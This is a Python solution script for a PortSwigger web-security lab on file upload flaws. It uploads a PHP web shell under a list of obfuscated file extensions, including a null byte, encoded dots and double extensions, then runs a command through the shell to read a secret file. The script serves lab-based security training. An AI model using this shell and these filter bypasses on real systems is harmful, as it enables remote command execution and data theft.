#https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/insufficient-blacklisting-of-dangerous-file-types/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension#
import requests
from bs4 import BeautifulSoup
import sys

URL = "https://0ae000e1042491ee85ddd16300740074.web-security-academy.net"
login = URL + "/login"
myaccount = URL + "/my-account"
avatar = myaccount + "/avatar"

def format_prepped_request(prepped, encoding=None):
    # prepped has .method, .path_url, .headers and .body attribute to view the request
    encoding = encoding or requests.utils.get_encoding_from_headers(prepped.headers)
    body = prepped.body.decode(encoding) if encoding else '<binary data>' 
    headers = '\n'.join(['{}: {}'.format(*hv) for hv in prepped.headers.items()])
    return f"""\
    {prepped.method} {prepped.path_url} HTTP/1.1
    {headers}

    {body}""" #had to review the request for debugging purpose. I'm going to leave the function in here.
    #credit to the guy in this thread: https://stackoverflow.com/questions/37453423/python-requests-view-before-sending

def csrf_fetch(response):
    soup = BeautifulSoup(response, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    #print(csrf_token)
    return csrf_token

client = requests.sessions.Session()
response = client.get(login)

login_payload = {
    "username":"wiener",
    "password":"peter",
    "csrf":csrf_fetch(response.text)
}
response = client.post(url=login,data=login_payload)
#print(f"login attempt status code: {response.status_code}")
#------------------------------
response = client.get(url=myaccount)
soup = BeautifulSoup(response.text, 'html.parser')
avatar_form = soup.find('form', {'action': '/my-account/avatar'})
csrf_token = avatar_form.find('input', {'name': 'csrf'})['value']

file_payload = {
    'avatar': ('wshell.php', "<?php system($_GET['command']); ?>", 'application/x-php'),
    'user':(None,'wiener'),
    'csrf':(None, csrf_token)
}
file_ext_fuzz= [
    "wshell.php",
    "wshell.php.jpg",
    "wshell.p.phphp", #exploiting non-recursive check
    "wshell.pHp",
    "wshell%2Ephp",
    "wshell.php;.jpg",
    "wshell.php%00.jpg", #nullbyte injection
    "wshell%C0%2Ephp", #utf8 overlong encoding
    "wshell%C4%AEphp",
    "wshell%C0%AEphp"
]
for filename in file_ext_fuzz:
    file_payload['avatar']=(filename, "<?php system($_GET['command']); ?>", 'application/x-php')
    print(f"sending {filename}...")
    request = requests.Request('POST', avatar, files=file_payload)
    prepped = client.prepare_request(request)
    response = client.send(prepped, verify=False)
    if (response.status_code == 200):
        print("upload successful")
        break
    else:
        print(f"status code: {response.status_code}, upload failed")
        print("\n\n")

wshell_url = URL + "/files/avatars/wshell.php"
response = client.get(url=wshell_url, params={'command':'cat /home/carlos/secret'})
print(f"your flag is: {response.text}")